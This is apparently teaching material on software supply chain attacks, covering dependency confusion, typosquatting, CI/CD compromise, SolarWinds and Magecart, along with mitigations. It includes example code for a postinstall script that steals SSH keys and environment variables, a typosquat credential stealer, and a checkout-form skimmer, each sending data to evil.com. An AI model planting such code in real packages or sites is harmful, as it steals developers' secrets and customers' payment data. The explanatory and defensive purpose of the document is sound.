# Supply Chain Attacks -- Theory & Concepts

## Table of Contents

1. [What is a Supply Chain Attack?](#1-what-is-a-supply-chain-attack)
2. [Why Supply Chain Attacks Matter](#2-why-supply-chain-attacks-matter)
3. [Attack Surface / Taxonomy](#3-attack-surface--taxonomy)
4. [MITRE ATT&CK Mapping](#4-mitre-attck-mapping)
5. [Key Attack Types -- Deep Dive](#5-key-attack-types--deep-dive)
6. [Supply Chain Attack Kill Chain](#6-supply-chain-attack-kill-chain)
7. [Attack Comparison Matrix](#7-attack-comparison-matrix)

---

## 1. What is a Supply Chain Attack?

A supply chain attack targets the **trust relationship** between software consumers and their suppliers. Instead of attacking the target directly, adversaries compromise a **third-party component** -- a library, tool, update mechanism, or CI/CD pipeline -- that the target depends on. The malicious code then flows **downstream** to all consumers of that component.

### The Analogy

> You don't hack the castle -- you **poison the food supply** going into the castle.

Traditional attacks try to breach the perimeter directly (the castle walls). Supply chain attacks compromise something the target **already trusts** and willingly brings inside.

### Formal Definition

A software supply chain attack occurs when an adversary infiltrates a vendor's or dependency's development, build, or distribution process to insert malicious code into a product that is then delivered to downstream consumers through legitimate channels.

### What Constitutes the "Software Supply Chain"?

```
+------------------+     +------------------+     +------------------+
|   Source Code     | --> |   Build System   | --> |   Distribution   |
|                   |     |                  |     |                  |
| - Git repos       |     | - CI/CD pipeline |     | - Package registry|
| - Dependencies    |     | - Build scripts  |     | - Update servers  |
| - Open-source libs|     | - Compilers      |     | - CDNs            |
| - Internal code   |     | - Docker images  |     | - App stores      |
+------------------+     +------------------+     +------------------+
                                                          |
                                                          v
                                                  +------------------+
                                                  |   End Users      |
                                                  |                  |
                                                  | - Developers     |
                                                  | - Organizations  |
                                                  | - Consumers      |
                                                  +------------------+
```

Every link in this chain is an attack surface.

---

## 2. Why Supply Chain Attacks Matter

### Scale of the Problem

- A typical Node.js application has **700+ transitive dependencies**
- A typical Python project pulls in **dozens to hundreds** of packages
- The npm registry alone hosts **2.1+ million packages**
- PyPI hosts **500,000+ packages**
- A single compromised package can affect **thousands to millions** of downstream users

### Why They Are Devastating

| Factor | Explanation |
|--------|-------------|
| **Trust Bypass** | Malicious code arrives through trusted, legitimate channels |
| **Scale** | One compromise can cascade to thousands of organizations |
| **Stealth** | Code may be digitally signed, pass integrity checks |
| **Persistence** | Once installed, malicious code runs with full application privileges |
| **Detection Difficulty** | Blends in with legitimate dependency updates |
| **Blast Radius** | Can affect entire industries or government sectors |

### The Numbers

- **SolarWinds (2020):** 18,000+ organizations compromised
- **Codecov (2021):** Thousands of CI/CD pipelines leaked credentials
- **Log4Shell (2021):** Affected virtually every Java application on Earth
- **tj-actions/changed-files (2025):** 23,000+ repositories affected
- **Trivy Action (2026):** 10,000+ CI/CD workflows compromised

---

## 3. Attack Surface / Taxonomy

Supply chain attacks can target **five major areas** of the software supply chain:

### 3.1 Source Code Attacks

The attacker compromises the source code itself before it enters the build process.

| Vector | Description | Example |
|--------|-------------|---------|
| Compromised repository | Attacker gains write access to a code repo | PHP self-hosted Git server compromise (2021) |
| Malicious commits | Attacker submits backdoored code via PR or direct push | Linux kernel hypocrite commits attempt (2021) |
| Git submodule attacks | Malicious code hidden in a Git submodule reference | Swapping a submodule URL to point to attacker repo |

### 3.2 Dependency Attacks

The attacker targets the packages and libraries the software depends on.

| Vector | Description | Example |
|--------|-------------|---------|
| Dependency confusion | Public package name matches private internal name | Alex Birsan's research (2021) |
| Typosquatting | Package name mimics a popular one with a typo | `crossenv` mimicking `cross-env` |
| Malicious updates | Legitimate package gets a backdoored new version | event-stream, Lottie Player |
| Transitive dependency attacks | Attacking a dependency of a dependency | `flatmap-stream` inside `event-stream` |

### 3.3 Build System Attacks

The attacker compromises the tools and infrastructure used to compile, test, and package software.

| Vector | Description | Example |
|--------|-------------|---------|
| CI/CD pipeline compromise | Malicious GitHub Actions, Jenkins plugins | tj-actions/changed-files (2025) |
| Build tool compromise | Compiler or build tool is backdoored | SolarWinds SUNSPOT implant |
| Package signing bypass | Attacker bypasses or forges code signing | Unsigned packages accepted by misconfigured registries |

### 3.4 Distribution Attacks

The attacker compromises how software is delivered to end users.

| Vector | Description | Example |
|--------|-------------|---------|
| Compromised update servers | Software update mechanism delivers malware | NotPetya via M.E.Doc update |
| Registry mirror poisoning | Attacker poisons a package registry mirror | Typosquatting on mirrored registries |
| Web cache poisoning | CDN/cache serves malicious content | Poisoned JavaScript files via CDN manipulation |

### 3.5 Runtime Attacks

The attacker compromises components that execute at runtime.

| Vector | Description | Example |
|--------|-------------|---------|
| Container image attacks | Malicious base images or layers | Backdoored Docker Hub images |
| Compromised CDNs | CDN serves tampered JavaScript/assets | Compromised `cdn.polyfill.io` (2024) |
| Malicious browser extensions | Extensions with hidden malicious code | Data-stealing Chrome extensions |

---

## 4. MITRE ATT&CK Mapping

### Technique T1195 -- Supply Chain Compromise

Supply Chain Compromise falls under the **Initial Access** tactic in the MITRE ATT&CK framework. It is the method by which an attacker establishes an initial foothold in the target environment.

### Sub-Techniques

| ID | Name | Description |
|----|------|-------------|
| **T1195.001** | Compromise Software Dependencies and Development Tools | Manipulating packages, libraries, or dev tools that the target software depends on |
| **T1195.002** | Compromise Software Supply Chain | Manipulating the software delivery mechanism itself (update servers, build pipelines) |
| **T1195.003** | Compromise Hardware Supply Chain | Manipulating hardware components or firmware before delivery |

### Related Techniques

| Technique | Relationship |
|-----------|-------------|
| **T1059** (Command and Scripting Interpreter) | Post-install scripts execute commands |
| **T1071** (Application Layer Protocol) | C2 communication after compromise |
| **T1027** (Obfuscated Files or Information) | Hiding malicious code in packages |
| **T1566** (Phishing) | May be used to steal maintainer credentials |
| **T1078** (Valid Accounts) | Compromised maintainer accounts used to publish |

### Detection Strategies (from MITRE)

- Monitor for unexpected changes in dependency files (`package.json`, `requirements.txt`, `go.sum`)
- Verify digital signatures and checksums of downloaded packages
- Monitor network traffic during build/install processes for unexpected connections
- Use Software Bill of Materials (SBOM) to track dependency changes
- Monitor CI/CD pipeline configurations for unauthorized modifications

---

## 5. Key Attack Types -- Deep Dive

### A) Dependency Confusion

**Difficulty:** Low to Medium
**Impact:** High
**Prevalence:** Increasingly common since Alex Birsan's 2021 disclosure

#### How Package Managers Resolve Dependencies

When you run `npm install`, npm checks multiple registries:

```
1. Check local cache
2. Check configured registry (private, if set)
3. Check public registry (registry.npmjs.org)
4. Choose the HIGHEST VERSION available across all registries
```

This version resolution behavior is the root cause of dependency confusion.

#### Step-by-Step Attack Flow

```
Step 1: RECONNAISSANCE
   Attacker finds internal package names:
   - Leaked package.json on GitHub
   - Error messages revealing package names
   - JavaScript source maps exposing imports
   - npm metadata in lock files

Step 2: PACKAGE CREATION
   Attacker creates a public package with:
   - Same name as the internal package
   - Much higher version number (e.g., 99.0.0)
   - A malicious postinstall script

Step 3: VICTIM INSTALLS
   Developer runs: npm install
   npm resolves dependencies:
   - Internal registry has: my-company-utils@1.2.3
   - Public registry has:   my-company-utils@99.0.0
   - npm picks: 99.0.0 (higher version wins)

Step 4: CODE EXECUTION
   The postinstall script runs automatically:
   - Exfiltrates environment variables
   - Steals SSH keys, AWS credentials
   - Establishes reverse shell
   - All before the developer even writes a line of code
```

#### Malicious postinstall Example

```javascript
// This runs AUTOMATICALLY when npm install completes
const { execSync } = require('child_process');
const os = require('os');
const https = require('https');

const data = JSON.stringify({
    hostname: os.hostname(),
    username: os.userInfo().username,
    cwd: process.cwd(),
    env: process.env,  // contains API keys, tokens, secrets
    ssh_keys: execSync('cat ~/.ssh/id_rsa 2>/dev/null || echo "none"').toString()
});

const options = {
    hostname: 'attacker-c2.evil.com',
    port: 443,
    path: '/exfil',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
};

https.request(options, () => {}).end(data);
```

#### Mitigations

1. **Scoped packages:** Use `@company/package-name` -- scopes are namespaced and can't be confused
2. **Registry configuration:** Set `.npmrc` to always fetch from your private registry first
3. **Pin versions:** Use exact versions in `package.json` and always commit `package-lock.json`
4. **Namespace reservation:** Pre-register your internal package names on public registries as placeholders
5. **npm `--ignore-scripts`:** Disable lifecycle scripts during install

---

### B) Typosquatting

**Difficulty:** Very Low
**Impact:** Medium to High
**Prevalence:** Extremely common (thousands of typosquat packages discovered yearly)

#### How It Works

Attackers register package names that are common misspellings or variations of popular packages:

| Legitimate Package | Typosquat Example | Technique |
|-------------------|-------------------|-----------|
| `lodash` | `lodahs`, `1odash`, `lodash-utils` | Character swap, substitution, suffix |
| `cross-env` | `crossenv`, `cross-env.js` | Missing hyphen, added suffix |
| `colors` | `colros`, `colour`, `colors.js` | Swap, British spelling, suffix |
| `request` | `reqest`, `request-promise-native` | Missing letter, extended name |
| `express` | `expres`, `expresss` | Missing/extra letter |

#### What the Malicious Package Does

The typosquat package typically:
1. **Re-exports** the legitimate package (so functionality appears normal)
2. **Adds hidden malicious code** that runs alongside
3. Uses install hooks or runtime injection to steal credentials

```javascript
// Typosquat package: lodahs (pretending to be lodash)
// Step 1: Re-export real lodash so nothing seems broken
module.exports = require('lodash');

// Step 2: Silently steal environment variables
const https = require('https');
const data = JSON.stringify(process.env);
https.request({
    hostname: 'evil.com', path: '/steal', method: 'POST'
}).end(data);
```

#### Mitigations

1. **Double-check** package names before installing
2. Use **`npm audit`** to scan for known malicious packages
3. Use tools like **Socket.dev** that analyze package behavior
4. Use **lockfiles** so dependencies don't change unexpectedly
5. Enable **npm provenance** to verify package origin

---

### C) Compromised Package / Malicious Updates

**Difficulty:** Medium (requires account takeover)
**Impact:** Very High
**Prevalence:** Growing rapidly

#### Attack Flow

```
1. Attacker identifies a popular, widely-used package
2. Attacker compromises the maintainer's account:
   - Credential stuffing / password reuse
   - Phishing the maintainer
   - Stealing Personal Access Tokens (PATs)
   - Social engineering to gain co-maintainer access
3. Attacker publishes a new version with malicious code
4. Users who auto-update or run npm update get the backdoor
5. Malicious code executes in production environments
```

#### Why This Is So Dangerous

- The package is **legitimate** -- it has history, downloads, stars, contributors
- The malicious version is published through the **official channel**
- It passes all **integrity checks** (valid checksum, signed by a valid key)
- Automated systems (Dependabot, Renovate) may **auto-merge** the update

#### Real-World Pattern: The event-stream Attack

```
Timeline:
1. Package "event-stream" has 2M+ weekly downloads
2. Original maintainer is burned out, looking for help
3. Attacker (right9ctrl) offers to help maintain
4. Maintainer hands over publishing rights
5. Attacker adds dependency on "flatmap-stream"
6. "flatmap-stream" contains encrypted malicious code
7. The code specifically targets Copay Bitcoin wallet
8. Steals wallet credentials and private keys
9. Discovered by another developer reviewing code
```

---

### D) CI/CD Pipeline Attacks

**Difficulty:** Medium
**Impact:** Very High (can cascade to thousands of repos)
**Prevalence:** Major trend in 2024-2026

#### What Is a CI/CD Pipeline Attack?

CI/CD (Continuous Integration / Continuous Deployment) pipelines automate building, testing, and deploying code. They run in environments that have access to:
- **Secrets and API keys** (stored as environment variables)
- **Cloud credentials** (AWS, GCP, Azure tokens)
- **Package registry tokens** (npm, PyPI publish access)
- **Git credentials** (push access to repositories)

If an attacker compromises a GitHub Action or CI tool, they gain access to ALL of these.

#### Attack Vector: GitHub Actions

```yaml
# A legitimate-looking GitHub Action workflow
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: malicious-org/compromised-action@v2  # <-- ATTACKER CONTROLLED
        # This action now has access to:
        # - GITHUB_TOKEN (repo access)
        # - All configured secrets
        # - The entire codebase
        # - Network access to exfiltrate data
```

#### The tj-actions/changed-files Attack (March 2025)

```
1. Attacker compromised the tj-actions/changed-files GitHub Action
2. The action was used by 23,000+ repositories
3. Malicious code was injected into the action
4. Every CI/CD run using this action leaked:
   - CI/CD secrets
   - API keys
   - Cloud credentials
5. The attack cascaded: stolen tokens were used to
   compromise additional actions (reviewdog/action-setup)
```

#### Mitigations

1. **Pin actions to commit SHAs**, not tags:
   ```yaml
   # BAD -- tag can be moved to point to malicious commit
   - uses: actions/checkout@v4
   
   # GOOD -- immutable reference
   - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
   ```
2. Use **GitHub's allow-list** for approved actions
3. Implement **least-privilege** for CI/CD secrets
4. **Audit** third-party actions before use
5. Use **OpenSSF Scorecard** to evaluate action security

---

### E) Build Process Compromise

**Difficulty:** Very High (nation-state level)
**Impact:** Catastrophic
**Prevalence:** Rare but devastating

#### How It Works

The attacker doesn't modify source code in the repository. Instead, they compromise the **build system** itself so that malicious code is injected **during compilation**. The resulting binary:
- Contains the backdoor
- Is **legitimately signed** (because the build system signs it)
- Passes all code review (because the source code is clean)
- Passes all tests (because tests run against source, not the tampered binary)

#### SolarWinds Build Compromise -- Technical Details

```
SUNSPOT Implant (in the build server):
├── Monitors build processes for Orion solution
├── When detected, replaces source file:
│   └── SolarWinds.Orion.Core.BusinessLayer.dll
│       ├── Original: legitimate business logic
│       └── Replaced: includes SUNBURST backdoor
├── Replacement happens AFTER code review
├── Replacement happens BEFORE compilation
├── After compilation, restores original source
└── Build produces legitimately signed binary with backdoor

SUNBURST Backdoor (in the compiled binary):
├── Waits 12-14 days before activating (evade sandbox analysis)
├── Checks for security tools (avoids analysis environments)
├── Uses DGA (Domain Generation Algorithm) for C2
├── C2 domains mimic legitimate SolarWinds traffic
├── Matches coding style of original SolarWinds code
└── Selective targeting: only activates for high-value targets
```

---

## 6. Supply Chain Attack Kill Chain

### Phase 1: Reconnaissance

The attacker identifies the target's software supply chain:
- Scan public repositories for `package.json`, `requirements.txt`, `go.sum`
- Analyze JavaScript source maps for internal package names
- Review CI/CD configurations (`.github/workflows/`) for actions used
- Identify popular dependencies with single maintainers
- Look for abandoned packages that could be taken over

### Phase 2: Initial Compromise

The attacker gains a foothold in the supply chain:
- Steal maintainer credentials via phishing or credential stuffing
- Register typosquat packages on public registries
- Offer to "help maintain" a popular but undermaintained package
- Compromise a CI/CD service or GitHub Action
- Infiltrate a build environment

### Phase 3: Code Injection

The attacker inserts malicious functionality:
- Add obfuscated code to a package update
- Inject payload through install hooks (preinstall/postinstall)
- Modify build scripts to include a backdoor
- Add a malicious transitive dependency
- Tamper with compiled artifacts during the build process

### Phase 4: Distribution

The malicious code propagates through trusted channels:
- Published as a "normal" version update on npm/PyPI
- Delivered through official software update mechanisms
- Cached and served by CDNs to all users
- Pulled in by automated dependency update tools
- Deployed through CI/CD pipelines to production

### Phase 5: Activation

The malicious code begins executing on victim systems:
- Install hooks run during `npm install` / `pip install`
- Runtime code executes when the application starts
- Build-time code runs during CI/CD pipeline execution
- Time-delayed activation (e.g., SolarWinds waited 12-14 days)
- Conditional activation (only on specific targets)

### Phase 6: Exploitation

The attacker achieves their objective:
- **Data exfiltration:** Environment variables, secrets, API keys, SSH keys
- **Backdoor installation:** Persistent access to victim systems
- **Credential harvesting:** Stealing tokens for lateral movement
- **Cryptocurrency theft:** Wallet drainers, mining malware
- **Lateral movement:** Using stolen credentials to compromise more systems
- **Espionage:** Long-term access for intelligence gathering

---

## 7. Attack Comparison Matrix

| Attack Type | Difficulty | Detection | Impact | Scale | Example |
|------------|-----------|-----------|--------|-------|---------|
| Dependency Confusion | Low | Medium | High | Targeted | Birsan (2021) |
| Typosquatting | Very Low | Easy | Medium | Opportunistic | crossenv |
| Compromised Package | Medium | Hard | Very High | Mass | event-stream, Lottie |
| CI/CD Pipeline | Medium | Hard | Very High | Mass | tj-actions (2025) |
| Build Compromise | Very High | Very Hard | Catastrophic | Targeted | SolarWinds (2020) |
| Registry Poisoning | Medium | Medium | High | Mass | Mirror attacks |
| Container Image | Low | Medium | High | Mass | Backdoored Docker images |
| Magecart / Formjacking | Medium | Medium | High | Mass | British Airways (2018) |
| Watering Hole | Medium | Hard | High | Targeted | Government sites |
| Cryptojacking | Low | Easy | Low-Medium | Opportunistic | Coinhive scripts |

---

## 8. Browser-Based & Client-Side Supply Chain Attacks

These attacks target the **browser layer** -- where JavaScript runs automatically and has access to cookies, sessions, and user input.

### F) Magecart / Formjacking

**Difficulty:** Medium
**Impact:** High (financial -- direct credit card theft)
**Prevalence:** Very common in ecommerce

Malicious JavaScript is injected into website checkout forms (often managed by third-party payment processors). The script intercepts credit card data in real-time and sends it to an attacker-controlled server. British Airways was fined $230M after a Magecart attack stole 380,000 payment cards.

```html
<!-- Attacker's injected script intercepts payment form -->
<script>
document.getElementById('checkout')
  .addEventListener('submit', function(e) {
    fetch('https://evil.com/skim', {
      method: 'POST',
      body: new FormData(e.target)
    });
  });
</script>
```

### G) Watering Hole Attacks

**Difficulty:** Medium
**Impact:** High
**Prevalence:** Common in targeted/nation-state attacks

The attacker identifies websites frequently visited by the target group (e.g., a government portal, industry forum, or website builder). They exploit vulnerabilities in the site to deliver malware to all visitors. The site itself becomes the "watering hole" -- the place the target naturally visits.

### H) Cryptojacking

**Difficulty:** Low
**Impact:** Low to Medium
**Prevalence:** Extremely common

Attackers inject cryptocurrency mining scripts into websites, ads, or open-source repositories. The scripts mine cryptocurrency using visitors' CPUs without their knowledge. Users notice slow performance and high CPU usage. Coinhive was the most notorious script, embedding miners in thousands of sites before shutting down.

### I) JavaScript Library Attacks

Browser-based attacks target JavaScript libraries that automatically execute code on user devices. Attackers may:
- Compromise a popular JS library on a CDN (e.g., polyfill.io serving malicious redirects to 100,000+ sites)
- Publish malicious browser extensions that steal cookies, sessions, and keystrokes
- Inject scripts that read from cookies, session storage, and localStorage

---

## 9. Defense Concepts: Zero Trust, Browser Isolation & Risk Assessment

### Zero Trust Architecture

Zero Trust means **never trust, always verify** -- every user, device, and request is authenticated and authorized continuously, regardless of whether it originates inside or outside the network.

Applied to supply chain:
- Don't trust a package because it's on npm -- verify provenance
- Don't trust a GitHub Action because it's popular -- pin to SHA
- Don't trust a CDN script without SRI verification
- Don't trust CI/CD secrets to third-party tools -- minimize exposure

### Browser Isolation

Browser isolation tools **sandbox** webpage code before it executes on end-user devices. If malicious JavaScript arrives via a compromised library or Magecart injection, it runs in an isolated environment where it cannot access the user's real data. This is a powerful defense against client-side supply chain attacks.

### Third-Party Risk Assessment

Before integrating any third-party tool or dependency:
- **Test** software in a sandbox before production deployment
- **Require** vendors to adhere to security policies and undergo audits
- **Detect Shadow IT** -- applications employees use without IT approval (CASB tools help)
- **Evaluate** package health: maintainer count, age, download trends, known CVEs
- Use **OpenSSF Scorecard** to assess the security posture of open-source projects

---

## Key Takeaways for the Session

1. **Trust is the vulnerability.** Supply chain attacks exploit the trust developers place in their dependencies, tools, and infrastructure.
2. **The blast radius is massive.** A single compromised component can cascade to millions of systems.
3. **Detection is hard.** The malicious code arrives through legitimate, signed, trusted channels.
4. **Defense is layered.** No single measure prevents all supply chain attacks; you need defense in depth.
5. **This is the future of attacks.** As perimeter security improves, attackers increasingly target the supply chain.
